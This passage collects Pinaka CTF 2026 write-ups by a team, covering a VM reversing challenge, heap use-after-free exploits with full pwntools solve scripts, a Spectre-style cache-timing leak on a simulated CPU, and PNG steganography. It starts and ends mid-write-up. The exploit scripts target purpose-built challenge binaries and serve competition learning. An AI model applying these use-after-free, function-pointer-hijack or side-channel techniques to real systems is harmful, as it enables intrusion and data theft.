    K = ((target - base) % p * pow(D, -1, p)) % p
    sols.append(K)

print(sols)   # [1799, 2879, 1995, 183, 3623, 2273]
```

Verifying with the emulator, which is deterministic, so its tag is the machine's own attestation:

```
$ ./prahara_emu firmware.rom 1799 2879 1995 183 3623 2273
awake=1
sleep_depth=0
garjana=
tag=a5f66ca0adfe80c20447b6bfa7a4b509e9b7ac5132d7acbda89d96b3a337f887
```

## Submission

```
POST /lanka/awaken
{"summons":[1799,2879,1995,183,3623,2273],
 "attestation":"a5f66ca0adfe80c20447b6bfa7a4b509e9b7ac5132d7acbda89d96b3a337f887"}
```

```json
{"flag":"PINAKA{kumbhakarna_six_drumbeats_pierce_the_sleep}",
 "proclamation":"Kumbhakarna's eyes open; the sleepless curse is broken.",
 "status":"awake"}
```

## Notes

- The extended-operand offset (`index = operand - 0x10`) was the biggest trap. Read the jump tables directly.
- `firmware_debug.rom` differs in 30 bytes and turns on extra GARJANA tracing (and one tick). It's a debug build, not the target. The release `firmware.rom` is the one whose tag the gate expects.
- Because both branch arms cost the same number of instructions, the drum schedule is input-independent, which turns a chicken-and-egg coupling into six independent modular equations over the prime 4093.
- The tag is SHA-256 over a structured transcript (`"PRAHARA1"` prefix, per-instruction `(pc, opcode)` trace, `"DUNDUBHI"`, `"GARJANA"`, and the emitted bytes). Reimplementing it is unnecessary: the emulator is the oracle, and only the `awake` predicate had to be reversed.

title: Pinaka: The Impossible Bow
excerpt: pinakabow is a custom VM host with a 1M-instruction program embedded in it. The validator wants a 24-byte "draw" as 48 hex chars. The decoding is state-dependent and the control flow is flattened, but the program…
content:
**[Pinaka CTF 2026](https://cyberhx.com/events/pinaka-ctf)** · Reverse engineering · Team Cryptonite · [All 44 Pinaka write-ups](https://cyberhx.com/blog/pinaka-ctf-2026-team-cryptonite-writeups)

---

**Category:** reverse engineering
**Flag:** `PINAKA{one_true_draw_bends_shivas_bow_and_rama_wins_mithila}`

## Overview

`pinaka_bow` is a custom VM host with a 1M-instruction program embedded in it. The validator wants a 24-byte "draw" as 48 hex chars. The decoding is state-dependent and the control flow is flattened, but the program never branches on the input, so every step can be run in reverse.

Files:

- `pinaka_bow`: x86-64 PIE, not stripped
- `bow.vmx`: the embedded program, byte-for-byte identical to the blob between `pinaka_blob_start` and `pinaka_blob_end`

```sh
./pinaka_bow <draw-hex>
```

![file and nm output showing the ELF is not stripped and the pinaka_blob symbols](https://cyberhx.com/writeups/cryptonite/rev/20.webp)

## Analysis

`main` hex-decodes `argv[1]`, checks the blob starts with `PNKBOW01`, and calls `vm_run.part.0(blob, blob_len, input, input_len)`. Return `1` prints `ACCEPT`, `0` prints `REJECT`, anything else prints `ERROR: malformed image or execution fault`.

The ELF couldn't be run in my setup, so everything below comes from `objdump -d -M intel` and a Python re-implementation.

**vmx header** (little-endian u32s after the magic):

- `0x08`: version (`1`)
- `0x0c`: input length (`0x18` = 24), must match exactly
- `0x10`: VM memory size (`0x20` = 32 bytes)
- `0x14`: seed (`0xba645b85`, falls back to `0x1234567` if zero)
- `0x18`: bytecode start (`0x2f2418`)
- `0x1c`: instruction budget (`0xf7fac`, loop runs `budget + 0x10` times)
- `0x20`: index of the result byte in memory (`0x18` = 24)
- `0x28`: 256-byte encrypted S-box

The input is copied to `mem[0..23]`. `mem[24..31]` starts at zero.

**S-box.** A xorshift32 stream seeded with the header seed gives 256 bytes, which are XORed with the 256 bytes at `0x28`:

```
s ^= s << 13; s ^= s >> 17; s ^= s << 5;  out.append(s & 0xff)
```

The result is a permutation of 0..255.

**Dispatch loop.** Each instruction is 8 bytes and a 32-bit rolling key (starts as the seed) decodes it:

```
op  = byte0 ^ (key & 0xff)
a   = byte1 ^ (key >> 8)
b   = byte2 ^ (key >> 16)
c   = byte3                  (raw, only used in the key update)
imm = dword4 ^ key
key = key*0x1000193 + op - 0x61c8864f + a + b + ((c ^ (key>>24)) & 0xff) + (imm & 0xff)
```

The key update uses values just decoded, so instruction N can't be decoded without executing everything before it. A linear sweep fails, an emulator works.

![vm_run dispatch loop and the jump table at 0x2004 in the disassembler](https://cyberhx.com/writeups/cryptonite/rev/21.webp)

Opcode 0 is checked before the jump table at `0x2004`:

- 0: `0x1693` -> halt, return `mem[res] == 0`
- 1: `0x1571` -> `mem[a] = S[mem[a]]`
- 2: `0x1633` -> `mem[a] += imm` (low byte)
- 3: `0x160b` -> `mem[a] ^= mem[b]`
- 4: `0x1590` -> nop
- 5: `0x1677` -> `mem[a] = imm`
- 6: `0x1652` -> `mem[res] |= mem[a] ^ imm` (the check)
- 7: `0x164b` -> `pc = imm` (unconditional jump)

Opcode 7 is the only control flow, and it is unconditional. The flattening just stitches fragments together, so every input runs the same operation sequence.

**Decoy.** `PINAKA{the_bow_answers_only_to_dharma_not_to_brute_force}` sits in `.rodata` and at offset `~0x128` in the vmx. It is padding, not the flag.

![strings output showing the decoy flag in the binary](https://cyberhx.com/writeups/cryptonite/rev/22.webp)

## Solution

**Lift.** Emulate the VM without any input, following `pc` and the key, and log each real operation. Nops and jumps are dropped.

```python
import struct, pickle

v = open('bow.vmx', 'rb').read()
ver, inlen, msz, seed, code, cnt, res, _, _ = struct.unpack('<9I', v[8:0x2c])

# sbox = blob[0x28:0x128] ^ xorshift32 stream
s = seed or 0x1234567
st = []
for i in range(256):
    s ^= (s << 13) & 0xffffffff
    s ^= s >> 17
    s ^= (s << 5) & 0xffffffff
    st.append(s & 0xff)
S = [v[0x28 + i] ^ st[i] for i in range(256)]

pc, key, trace = code, seed, []
for step in range(cnt + 0x10):
    op = (v[pc] ^ key) & 0xff
    if op == 0:
        trace.append(('H',)); break
    a   = (v[pc+1] ^ (key >> 8)) & 0xff
    b   = (v[pc+2] ^ (key >> 16)) & 0xff
    c   = v[pc+3]
    imm = (struct.unpack('<I', v[pc+4:pc+8])[0] ^ key) & 0xffffffff
    npc = pc + 8
    if   op == 1: trace.append(('S', a))
    elif op == 2: trace.append(('A', a, imm & 0xff))
    elif op == 3: trace.append(('X', a, b))
    elif op == 4: pass
    elif op == 5: trace.append(('M', a, imm & 0xff))
    elif op == 6: trace.append(('C', a, imm & 0xff))
    elif op == 7: npc = imm
    else: raise SystemExit(f'badop {op} at step {step}')
    key = (key * 0x1000193 + op - 0x61c8864f + a + b
           + ((c ^ (key >> 24)) & 0xff) + (imm & 0xff)) & 0xffffffff
    pc = npc

pickle.dump((S, trace, res), open('trace.pkl', 'wb'))
```

```
1015723 steps, 930207 real ops
Counter({'S': 401065, 'A': 299840, 'X': 229276, 'C': 24, 'M': 1, 'H': 1})
```

It halts cleanly with no bad opcodes and no bounds errors, so the decoding is right.

![emulator output showing the step count and opcode counter](https://cyberhx.com/writeups/cryptonite/rev/23.webp)

The trace has this shape:

- Only `mem[0..23]` is ever touched.
- At index `930181` there is one `M` (`mem[24] = 0`) that clears the result byte, then 24 `C` checks, one per `mem[0]`..`mem[23]`.
- Every cell depends on all 24 input bytes by then, so it can't be solved byte by byte.

The checks are:

```
mem[0]==42   mem[1]==69   mem[2]==86   mem[3]==31   mem[4]==198  mem[5]==138
mem[6]==26   mem[7]==219  mem[8]==159  mem[9]==62   mem[10]==200 mem[11]==185
mem[12]==222 mem[13]==240 mem[14]==156 mem[15]==79  mem[16]==250 mem[17]==240
mem[18]==97  mem[19]==13  mem[20]==102 mem[21]==156 mem[22]==168 mem[23]==223
```

**Invert.** Every op before the checks is reversible:

- `S`: apply the inverse S-box (it's a permutation)
- `A`: subtract the constant mod 256
- `X`: `mem[a] ^= mem[b]` undoes itself as long as `a != b` (asserted, never fires)

The body is a bijection on 24 bytes, so there is exactly one valid input. Start from the 24 expected values and apply the inverse ops in reverse order, then run the result forward to confirm the accumulator stays 0.

```python
import pickle
S, tr, res = pickle.load(open('trace.pkl', 'rb'))
Si = [0] * 256
for i, x in enumerate(S):
    Si[x] = i

body = tr[:930181]                       # everything before the M / checks
assert all(t[1] != t[2] for t in body if t[0] == 'X')

m = [0] * 24
for t in tr[930182:930206]:              # the 24 checks give the target state
    m[t[1]] = t[2]

for t in reversed(body):
    if   t[0] == 'S': m[t[1]] = Si[m[t[1]]]
    elif t[0] == 'A': m[t[1]] = (m[t[1]] - t[2]) & 255
    elif t[0] == 'X': m[t[1]] ^= m[t[2]]

x = bytes(m)
print(x.hex())

# forward check
f = list(x) + [0] * 8
for t in tr:
    if   t[0] == 'S': f[t[1]] = S[f[t[1]]]
    elif t[0] == 'A': f[t[1]] = (f[t[1]] + t[2]) & 255
    elif t[0] == 'X': f[t[1]] ^= f[t[2]]
    elif t[0] == 'M': f[t[1]] = t[2]
    elif t[0] == 'C': f[res] |= f[t[1]] ^ t[2]
print('acc', f[res])
```

```
7a56e835fc372462249b2c08fe6349ce8f8699d3599a02f8
acc 0
```

![solver output printing the draw hex and acc 0](https://cyberhx.com/writeups/cryptonite/rev/24.webp)

## Submission

```sh
curl -s -X POST https://pinaka-m03-cyber-xo-x.vercel.app/bow/string \
  -H 'Content-Type: application/json' \
  -d '{"draw":"7a56e835fc372462249b2c08fe6349ce8f8699d3599a02f8"}'
```

```json
{"flag":"PINAKA{one_true_draw_bends_shivas_bow_and_rama_wins_mithila}",
 "proclamation":"The bow bends, the string sings, Pinaka is strung.",
 "result":"accepted"}
```

## Notes

- The rolling key blocks static disassembly but not emulation, because it never depends on the input.
- The flattening uses only unconditional jumps, so the whole VM is one fixed sequence of ops.
- Bijective S-box, add-constant and XOR between two different cells are all invertible. Check whether the ops can be inverted before reaching for z3.
- The answer is raw binary, not printable text.

title: Lankadahana: Trial by Agni
excerpt: Hanuman's tail was set alight, so he set all of Lanka ablaze. The city's memory burns in a machine that trusts its own ashes. Light the first spark and let the fire spread.
content:
**[Pinaka CTF 2026](https://cyberhx.com/events/pinaka-ctf)** · Binary exploitation · Team Cryptonite · [All 44 Pinaka write-ups](https://cyberhx.com/blog/pinaka-ctf-2026-team-cryptonite-writeups)

---

Hanuman's tail was set alight, so he set all of Lanka ablaze. The city's memory burns in a machine that trusts its own ashes. Light the first spark and let the fire spread.

Target: `nc 137.23.48.54 10000`

Category: PWN / Binary Exploitation Flag format: PINAKA{...}

## Solve

Checksec:

```
 Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
```

On extracting libc from the docker it was 2.41

![Lankadahana - Trial by Agni: step screenshot](https://cyberhx.com/writeups/cryptonite/bin/lankadahana-1.webp)

So we assumed next pointer mangling to be on and solved accordingly.

We began with the usual checks. The binary had Full RELRO, a stack canary, NX and PIE. It was a small C++ program, but stripped, so there were no helpful function names beyond the imported libc calls.

`main` was easy enough to find from the entry point. It read one byte at a time and used that byte as an index into a jump table. After reversing the cases, the protocol looked roughly like this:

| Opcode | What it did |
| --- | --- |
| `1` | Allocate an object: `01 <type>`  ->  `u16 handle` |
| `2` | Write to an object: `02 <handle> <offset> <len> <data>` |
| `3` | Read from an object: `03 <handle> <offset> <len>`  ->  length + data |
| `5` | Create an event for a handle |
| `6` | Fire an event |
| `7` | Service an event queue |
| `8` | Call a "special" handle |
| `0x10` | Submit a gate answer |
| `0x11` | Dump some internal state |

The allocator always handed out `0x60`-byte chunks. Each object had a small header, and the user data started at offset `0x10`:

```
node + 0x00 : generation tag
node + 0x04 : event/pin count
node + 0x06 : alive flag
node + 0x08 : free-list next pointer
node + 0x10 : user area
```

Every handle entry remembered the node pointer, the node type, and the generation it expected. Before a handle could be used, the lookup function checked that the entry was active, that the node was alive, and that the node's generation still matched the generation stored in the handle.

That last check was interesting. It looked like the binary was trying to protect against use-after-free, but when we followed the free and allocation paths, the generation was never incremented. Freeing a node only cleared the alive flag. Allocating that same chunk again set the alive flag back to `1`, but left the generation alone. In other words, an old handle would start working again as soon as its chunk was reused.

### Gate 1

At startup, the binary generated eight random bytes and stored them at `node+0x18` of the node that the next allocation returned. Since user data starts at `node+0x10`, that was just user offset `8`.

So gate 1 was a straightforward leak:

```python
first = u16(req(p8(1) + p8(0), 2))
gate(read8(first))
```

`read8` sent a read request for offset `8`, length `8`, and the secret came straight back. Submitting it moved us to gate 2.

### Gate 2

The second gate was not a memory-corruption problem. At startup the program also built a random graph traversal and stored it in a byte vector. The trace looked like:

```
[node count] [steps...] [target index]
```

A `0` step meant "new node" (or a revisit), while a byte with the high bit set meant "pop this active node". The final byte picked one of the active nodes, and the answer was that node's visit count.

Opcode `0x11` dumped the trace while we were on gate 2. We replayed the same logic in Python and submitted the result:

```python
trace = r.recvn(u16(r.recvn(2)))
active, revisits, counts = [], [], []

for step in trace[1:-1]:
    if step == 0:
        if revisits:
            node = revisits.pop()
        else:
            node = len(counts)
            counts.append(1)
        active.append(node)
    else:
        node = active.pop(step & 0x7f)
        counts[node] += 1
        revisits.append(node)

gate(p32(counts[active[trace[-1]]]))
```

Gate 2 fell, and we were at gate 3.

### Gate 3

Gate 3 wanted two different handles that pointed to the same node.

The missing generation increment made that almost trivial:

1. Allocate a node and keep its handle (`first`).
2. Release it. The node goes back to the free list, but the old handle entry stays behind.
3. Allocate again. The allocator reuses the same chunk and sets it alive, but the generation is unchanged.
4. The old `first` handle now passes the lookup check again, and the new handle points to the same node.

```python
release(first)
second = u16(req(p8(1) + p8(0), 2))
gate(p16(first) + p16(second))
```

That was gate 3.

### Gate 4

We freed the shared node again, then allocated it as a type-3 object. Type 3 turned the node into a callable object and stored the runtime address of `0x3600` at `node+0x18`.

The stale `first` handle could still read that location, so it leaked a PIE address for us:

```python
ch = u16(req(p8(1) + p8(3), 2))   # type 3 node
cb = u64(read8(first))             # runtime address of 0x3600
```

While the gate was at state 4, opcode `0x11` also leaked the random eight-byte XOR key. Gate 4's expected answer was simply:

```
address_of_0x3600 ^ key
```

So we sent:

```python
req(p8(0x11), 1)
r.recvn(2)
gate(p64(cb ^ u64(r.recvn(8))))
```

And that was gate 4.

### Gate 5

The fifth gate was the actual exploit.

A type-3 node could be invoked with opcode `8`. Internally, the program did something equivalent to:

```c
void (*fn)(void *) = *(void **)(node_data + 8);
fn(node_data);
```

The function pointer lived at user offset `8`. We still had the stale `first` handle, but its handle entry still said the object was a normal type (`0x4701`), while the actual node had become the callable type (`0x4704`). The write handler used the handle entry's type for its bounds check, so it let us write eight bytes at offset `8` and overwrite the function pointer.

There was one more wrinkle: the correct target depended on ASLR. The binary had twelve small handlers at `0x3700`, `0x3800`, ..., `0x4200`. Each one set the expected gate-5 index and jumped to the final check. The index the binary expected was:

```python
r = (cb >> 12) % 12
```

so the right handler for the current run was:

```python
t = cb + 0x100 * (r + 1)
```

We overwrote the callable node's function pointer with `t`, then invoked it:

```python
req(p8(2) + p16(first) + p16(8) + p16(8) + p64(t), 1)
r.send(p8(8) + p16(ch))
```

The call landed in the correct handler, which jumped to the final gate check. Since the gate state was 5 and we had not tripped the failure counter, the program took its victory path and called `getenv("PINAKA_FLAG")`.

![Lankadahana - Trial by Agni: step screenshot](https://cyberhx.com/writeups/cryptonite/bin/lankadahana-2.webp)


Solve script:

```python
#!/usr/bin/env python3

import os
from pwn import *

exe = ELF("lanka-dahan")

context.binary = exe


def conn():
    if args.LOCAL:
        env = os.environ.copy()
        env.setdefault("PINAKA_FLAG", "ggfez - hey dont say that - fricking ez")
        r = process([exe.path], env=env)
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("137.23.48.54", 10000)
        print(r.recvline().decode().strip())

    return r


def main():
    r = conn()

    def req(payload, size):
        r.send(payload)
        return r.recvn(size)

    def gate(answer):
        req(p8(0x10) + p16(len(answer)) + answer, 1)
        print(r.recvn(u16(r.recvn(2))).decode())

    def read8(handle):
        req(p8(3) + p16(handle) + p16(8) + p16(8), 2)
        return r.recvn(8)

    def release(handle):
        event = u16(req(p8(5) + p16(handle) + p8(0), 2))
        for payload in (p8(6) + p16(event), p8(7) + p8(0), p8(7) + p8(0)):
            req(payload, 1)

    first = u16(req(p8(1) + p8(0), 2))
    gate(read8(first))

    req(p8(0x11), 1)
    trace = r.recvn(u16(r.recvn(2)))
    active, revisits, counts = [], [], []
    for step in trace[1:-1]:
        if step == 0:
            if revisits:
                node = revisits.pop()
            else:
                node = len(counts)
                counts.append(1)
            active.append(node)
        else:
            node = active.pop(step & 0x7f)
            counts[node] += 1
            revisits.append(node)
    gate(p32(counts[active[trace[-1]]]))

    release(first)
    second = u16(req(p8(1) + p8(0), 2))
    gate(p16(first) + p16(second))

    release(second)
    ch = u16(req(p8(1) + p8(3), 2))
    cb = u64(read8(first))
    req(p8(0x11), 1)
    r.recvn(2)
    gate(p64(cb ^ u64(r.recvn(8))))

    t = cb + 0x100 * ((cb >> 12) % 12 + 1)
    req(p8(2) + p16(first) + p16(8) + p16(8) + p64(t), 1)
    r.send(p8(8) + p16(ch))
    print(r.recvn(u16(r.recvn(2))).decode())
    print(r.recvn(u16(r.recvn(2))).decode())
    r.close()

if __name__ == "__main__":
    main()
```

title: Setu Bandhan: Trial by Agni
excerpt: A hardened custom-allocator daemon with a binary stone-forge protocol. Exploit generation-tag wraparound causing a UAF via cross-thread recycling to gain code execution and consecrate the bridge.
content:
**[Pinaka CTF 2026](https://cyberhx.com/events/pinaka-ctf)** · Binary exploitation · Team Cryptonite · [All 44 Pinaka write-ups](https://cyberhx.com/blog/pinaka-ctf-2026-team-cryptonite-writeups)

---

A hardened custom-allocator daemon with a binary stone-forge protocol. Exploit generation-tag wraparound causing a UAF via cross-thread recycling to gain code execution and consecrate the bridge.

Connection: `nc 130.210.48.10 9008`

## Solve

The attachment was updated to aarch64 pie so offsets for everything changed but few steps remained the same.

first we leak the cookie from and vtable stub address

then we reallocate the block as a mark and then `INSCRIBE` can write at offset 0.
when we overwrite the vtable stub address with the address of the fire routine and write `vtable ^ cookie` at `0x20` from the vtable stub address

then we wrap the generate 256 times with `FERRY` so the state anchor handle becomes valid again
`CONSECRATE` the stal ehandle, then indirect call into fire route and then we get the flag

all these challenges have very similar concepts of consecrate reusing the stale handle

Initially, the nc wasn't responding, then after talking on the tickets, they changed the binary and fixed the nc, the local solve needed few changes before it could be run on the nc.

![Setu Bandhan - Trial by Agni: step screenshot](https://cyberhx.com/writeups/cryptonite/bin/s03-1.webp)
![Setu Bandhan - Trial by Agni: step screenshot](https://cyberhx.com/writeups/cryptonite/bin/s03-2.webp)

```python
#!/usr/bin/env python3
from pwn import *

context.log_level = "info"

BIN = "./setu-bandhan"
MAX_IO = 512

HOST = "130.210.48.10"
PORT = 9008

VTABLE_OFF = 0x1A00
FIRE_OFF = 0x1BE0


def start():
    if args.LOCAL:
        return process(
            ["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", BIN],
            env={"PINAKA_FLAG": "PINAKA{local-practice-solve}"},
        )

    if args.REMOTE:
        if ":" in args.REMOTE:
            host, port = args.REMOTE.rsplit(":", 1)
        else:
            host, port = args.REMOTE, str(PORT)
    else:
        host, port = HOST, str(PORT)

    r = remote(host, int(port))

    try:
        banner = r.recvline(timeout=3)
        if banner:
            info(f"banner: {banner.decode(errors='replace').strip()}")
    except EOFError:
        raise SystemExit("server closed before sending the banner")
    return r


p = start()


def quarry(subtype: int) -> int:
    p.send(bytes([0x01, subtype & 0xFF]))
    return u16(p.recvn(2))


def inscribe(handle: int, offset: int, data: bytes) -> bool:
    assert len(data) <= MAX_IO
    p.send(bytes([0x02]) + p16(handle) + p16(offset) + p16(len(data)) + data)
    return p.recvn(1) == b"\x01"


def survey(handle: int, offset: int, length: int) -> bytes:
    assert length <= MAX_IO
    p.send(bytes([0x03]) + p16(handle) + p16(offset) + p16(length))
    n = u16(p.recvn(2))
    return p.recvn(n) if n else b""


def release(handle: int) -> bool:
    p.send(bytes([0x04]) + p16(handle))
    return p.recvn(1) == b"\x01"


def ferry(handle: int, crew: int = 0) -> int:
    p.send(bytes([0x05]) + p16(handle) + bytes([crew & 0xFF]))
    return u16(p.recvn(2))


def place(handle: int) -> bool:
    p.send(bytes([0x06]) + p16(handle))
    return p.recvn(1) == b"\x01"


def status() -> tuple:
    p.send(bytes([0x10]))
    b = p.recvn(2)
    return b[0], b[1]


def framed() -> bytes:
    n = u16(p.recvn(2))
    return p.recvn(n)


h0 = quarry(1)
info(f"h0 (anchor) = {h0}")
cookie = u64(survey(h0, 0x18, 8))
info(f"cookie = {cookie:#x}")
if not release(h0):
    raise SystemExit("release(h0) failed")

h1 = quarry(0)
info(f"h1 (mark) = {h1}")
leak = u64(survey(h1, 8, 8))
info(f"vtable leak = {leak:#x}")

target = leak + (FIRE_OFF - VTABLE_OFF)
check = leak ^ cookie
info(f"target = {target:#x}, check = {check:#x}")

if not inscribe(h1, 8, p64(target)):
    raise SystemExit("write(target) failed")
if not inscribe(h1, 0x10, p64(check)):
    raise SystemExit("write(check) failed")

batch = b"".join(bytes([0x05]) + p16(i) + b"\x00" for i in range(1, 256))
p.send(batch)
replies = p.recvn(2 * 255)
new_handles = [u16(replies[i:i + 2]) for i in range(0, len(replies), 2)]
if new_handles[-1] == 0xFFFF:
    raise SystemExit("ferry batch failed")
info(f"ferry batch done, last handle = {new_handles[-1]}")
for i in range(8):
    h = quarry(1)
    if not inscribe(h, 0x10, p32(i)):
        raise SystemExit(f"anchor {i} write failed")
    if not place(h):
        raise SystemExit(f"place {i} failed")
placed, sealed = status()
info(f"status: placed={placed} sealed={sealed}")
if placed != 8 or sealed != 1:
    raise SystemExit("bridge did not seal")


p.send(bytes([0x07]) + p16(h0))
print(p.recv())

p.close()

```

title: Siddhashrama: The Unbroken Vigil
excerpt: Reverse a stripped concurrent daemon with a custom slab allocator. Find the deterministic UAF seam in ward hand-off/renewal, craft a memory primitive, and complete the restricted proof.
content:
**[Pinaka CTF 2026](https://cyberhx.com/events/pinaka-ctf)** · Binary exploitation · Team Cryptonite · [All 44 Pinaka write-ups](https://cyberhx.com/blog/pinaka-ctf-2026-team-cryptonite-writeups)

---

Reverse a stripped concurrent daemon with a custom slab allocator. Find the deterministic UAF seam in ward hand-off/renewal, craft a memory primitive, and complete the restricted proof. Connection: `nc 130.210.48.10 9002`

## Solve

So basically, stale handle in the ward arena lets `GET` read the guardian onject that `CONSECRATE` places in the freed slot. The guardian starts with an 8 byte seal.

Running `PROVE` with that seal gives the flag.


basically, ward assigns a slot
then entrust will OR the 0xE flag with the 32 bit flags field

then retire will or with 0x1
this will make it sweep eligible
sweep will free the slot and free it, but then it returns a stale pointer which can be reclaimed by consecrate
consecrate will instlal guardian object
then get 0 will leak the bytes
we then prove with PROVE 0

We just need to pass this check:

![Siddhashrama - The Unbroken Vigil: step screenshot](https://cyberhx.com/writeups/cryptonite/bin/siddhashrama-1.webp)

```
The Mandala holds 256 ward-slots. Commands (one per line):
```

`RELEASE` won't work because it will clear the handle table entry. we need to go through `ENTRUST` + `RETIRE` + `SWEEP` to prove guardian

title: Vali: The Hidden Arrow
excerpt: A simulated VANARA-1 CPU guards a secret in kernel memory. The CPU faithfully executes your programs but enforces strict bounds on every access. The arrow that found Vali struck through the trees unseen - find the…
content:
**[Pinaka CTF 2026](https://cyberhx.com/events/pinaka-ctf)** · Binary exploitation · Team Cryptonite · [All 44 Pinaka write-ups](https://cyberhx.com/blog/pinaka-ctf-2026-team-cryptonite-writeups)

---

A simulated VANARA-1 CPU guards a secret in kernel memory. The CPU faithfully executes your programs but enforces strict bounds on every access. The arrow that found Vali struck through the trees unseen - find the flaw in the CPU's defenses and recover the secret.

Validator: [https://pinaka-k03-cyber-xo-x.vercel.app/](https://pinaka-k03-cyber-xo-x.vercel.app/ "https://pinaka-k03-cyber-xo-x.vercel.app/")

## Solve

This is a microarch challenege

End points:

```
GET  /vanara/doc    -- ISA reference
POST /vanara/run    -- {program:<hex>} : run guest bytecode, returns {output:<hex>}
POST /vanara/claim  -- {secret:<recovered>} : disclose the secret to get the flag
```


It was Spectre V1 bounds check bypass

First we need to train the 2 bit bounds predictor with in bounds `GINV` calls (index 0). This biases the predictor to in bounds.

Then we `FLUSH` the cache to clear all the training memory

`GINV i` with `i` out of bounds. The predictor mispredicts in bunds, so the transient windo the gadget speculatively reads `kernel_mem[i]` (the secret byte `b`) and touches probe line `256 +b`
before the guard resolves and stops the path.

now we can just scan tthe probe lines 256-511 with `TIME`
one hot line gives b = hot_line - 256 .


Required hex digest:

```
kishkindha::cb49ebd35c0f5256cf6606929a7f6cd9
```

Script:

```python
#!/usr/bin/env python3
import sys
from pathlib import Path

import requests

sys.path.insert(0, str(Path(__file__).resolve().parent / "K03_player"))
from vanara_asm import assemble

TARGET = sys.argv[1] if len(sys.argv) > 1 else "https://pinaka-k03-cyber-xo-x.vercel.app"

PROBE_BASE_LINE = 256
PROBE_STRIDE = 64
NPROBE = 256
SECRET_START = 16
NTRAIN = 6


def leak_one(index):
    src = ["MOVI R7, 0"] + ["GINV R7"] * NTRAIN
    src += [
        "FLUSH",
        f"MOVI R7, {index}",
        "GINV R7",
        f"MOVI R1, {PROBE_BASE_LINE * PROBE_STRIDE}",
        f"MOVI R4, {PROBE_STRIDE}",
        f"MOVI R5, {NPROBE}",
        "MOVI R6, 0",
        "scan:",
        "TIME R2, R1",
        "OUT R2",
        "ADD R1, R1, R4",
        "ADDI R6, R6, 1",
        "CMPLT R3, R6, R5",
        "JNZ R3, scan",
        "HALT",
    ]
    program = assemble("\n".join(src)).hex()

    r = requests.post(f"{TARGET}/vanara/run", json={"program": program}, timeout=30)
    out = bytes.fromhex(r.json()["output"])
    return next(i for i, b in enumerate(out) if b)


def main():
    secret = bytearray()
    index = SECRET_START
    while True:
        byte = leak_one(index)
        if byte == 0:
            break
        secret.append(byte)
        print(f"[{index:3d}] 0x{byte:02x} {chr(byte) if 32 <= byte < 127 else '.'}")
        index += 1

    text = secret.decode()
    print(f"[+] secret: {text}")

    r = requests.post(f"{TARGET}/vanara/claim", json={"secret": text}, timeout=30)
    print(r.json())


if __name__ == "__main__":
    main()

```

title: Agni Pariksha
excerpt: An ancient painting of Sita's trial by fire has survived millennia... but it carries more than art. The ancients of Bharat were masters of hidden knowledge - from Vatsyayana's 64 arts of secret writing to the…
content:
**[Pinaka CTF 2026](https://cyberhx.com/events/pinaka-ctf)** · Forensics · Team Cryptonite · [All 44 Pinaka write-ups](https://cyberhx.com/blog/pinaka-ctf-2026-team-cryptonite-writeups)

---

## Challenge

> An ancient painting of Sita's trial by fire has survived millennia... but it carries more than art.
>
> The ancients of Bharat were masters of hidden knowledge - from Vatsyayana's 64 arts of secret writing to the mathematical encoding systems of Sanskrit scholars. They hid truths within beauty, numbers within poetry, and secrets within fire.
>
> This painting holds a secret encoded using techniques from the golden age of Indian cryptography. No modern tool will simply hand you the answer - you must think like the ancients.

We're given one image, `agni_pariksha.png` (1400x1000 RGB, 2.3 MB). It's a painting of Sita at the fire with Rama on the other side.

## Recon

First thing, exiftool. Most of the metadata is in Sanskrit, so I've put the translations next to each field:

```
exiftool agni_pariksha.png
...
Description  : || Agni Pariksha || - proof of Sita's purity
Author       : the ancient painter
Comment      : the secret is hidden in the Panchavati exile. search with binwalk.
Hint         : read it in a spiral, along the kundalini path. start from the fire-coil and go outward.
Software     : PINAKA CTF v3.0 - CyberHX
PNG Warning  : where there is fire, there is truth
Warning      : [minor] Trailer data after PNG IEND chunk
```

That's a lot of hints at once. There's data after IEND, the comment literally says binwalk, and the hint says the actual secret is read in a spiral starting from the fire. So it's steg.

## The zip

binwalk finds a zip right after the PNG ends, at offset 0x232099 (684 bytes), with one file in it: `agni_kundal_mantra.txt`. I carved it out and it's password protected. The comment already gave the password away: Panchavati, so `PANCHAVATI`. The zip uses AES (method 99), so plain `unzip` just skips the file, but 7z opens it:

```
dd if=agni_pariksha.png of=hidden.zip bs=1 skip=2302105
7z x -pPANCHAVATI hidden.zip
```

## The mantra

The text file is all Sanskrit again. The numbers are written in Bhutasankhya, where words stand for digits: sagara (ocean, as in the seven seas) = 7, shunya (void) = 0, indriya (the senses) = 5, agni (the fires) = 3, and bindu (dot) is the decimal point. Going line by line:

```
read it in a spiral, going outward from the centre of the fire like a kundalini

centre:   sagara-shunya-shunya, indriya-shunya-shunya   ->  x = 700, y = 500
growth:   agni-bindu-sagara pixels per turn             ->  3.7 px per turn
colour:   in red (position zero), in the lowest part    ->  red channel, LSB

hidden with mlecchita vikalpa, the Kamasutra's art of secret writing:
  A<->N, B<->O, ... M<->Z
  digits too: 0<->5, 1<->6, ... 4<->9
```

So: walk an Archimedean spiral out from (700, 500), growing 3.7 px every full turn, and read the LSB of the red channel at each pixel. The cipher at the end is ROT13 for letters and ROT5 for digits. Didn't expect the Kamasutra to show up in a CTF, but ok.

## Reading the spiral

I stepped the angle by 0.5 rad, used `r = 3.7 * theta / (2*pi)`, floored the coordinates, skipped anything off the image, and kept only the first visit to each pixel (the spiral hits the same pixel several times near the centre). Then I packed the bits MSB first:

```python
from PIL import Image
import numpy as np, math

a = np.array(Image.open("agni_pariksha.png"))
R = a[:, :, 0] & 1
H, W = R.shape

t = np.arange(5000) * 0.5
r = 3.7 * t / (2 * math.pi)
x = np.floor(700 + r * np.cos(t)).astype(int)
y = np.floor(500 + r * np.sin(t)).astype(int)
m = (x >= 0) & (x < W) & (y >= 0) & (y < H)
x, y = x[m], y[m]
_, i = np.unique(y * W + x, return_index=True)
i = np.sort(i)

b = np.packbits(R[y[i], x[i]]).tobytes()
print(b[:40])
```

```
python3 x.py
b'\x00\x00\x00\x1eCVANXN{thcg9_y6c6_9ta6_f9gl9z}\x89\xf9\xa7\x8ai\x91'
```

The first 4 bytes are a big-endian length, `0x1e` = 30, which is exactly the length of `CVANXN{thcg9_y6c6_9ta6_f9gl9z}`. `CVANXN` is `PINAKA` in ROT13, so that confirms the cipher.

## Decoding

ROT13 on the letters and ROT5 on the digits:

```
